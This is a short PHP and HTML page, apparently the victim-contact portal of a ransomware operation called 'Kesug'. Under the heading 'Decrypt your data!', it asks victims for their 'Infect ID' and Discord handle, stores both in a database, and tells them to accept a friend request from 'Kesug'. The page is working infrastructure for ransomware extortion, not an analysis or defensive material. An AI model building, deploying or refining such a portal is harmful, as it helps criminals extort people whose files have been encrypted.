<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <center><h1>Kesug</h1></center>
    <center><h3>Decrypt your data!</h3></center>
    <center>
        <div>
            <form method="POST">
                <label for="id">Infect ID: </label>
                <input type="text" name="id" id="id" placeholder="Enter your infect ID">
                <br><br>
                <label for="discord">Discord: </label>
                <input type="text" name="discord" id="discord" placeholder="Enter your Discord">
                <br><br><br>
                <input type="submit" name="submit" id="submit" value="Submit">
            </form>
            <br><br><br>
        </div>
    </center>
    <?php
        require("config.php");

        try{
            $con = mysqli_connect($serverName, $dbUsername, $dbPassword, $dbName);
        } catch (Exception $e){
            echo "<center><font color='red'>Connection failed, please check your internet connection. If our servers are down, please wait until we recover them.</font></center>";
            exit();
        }

        if (isset($_POST['submit'])){
            $id = $_POST['id'];
            $discord = $_POST['discord'];
            
            if(!empty($id) && !empty($discord)){
                $insert_query = "INSERT INTO user_info (infect_id, discord) values(?, ?)";

                $stmt = $con -> prepare($insert_query);
                $stmt -> bind_param("ss", $id, $discord);
                $stmt -> execute();

                echo "<center><font color='green'>Successfully submited.<br>Please wait until we reach out to you.<br>Accept our friend request/DM with the username: Kesug</font></center>";
            } else {
                echo "<center><font color='red'>All fields are required.</font></center>";
            }
            
        }

    ?>
</body>
</html>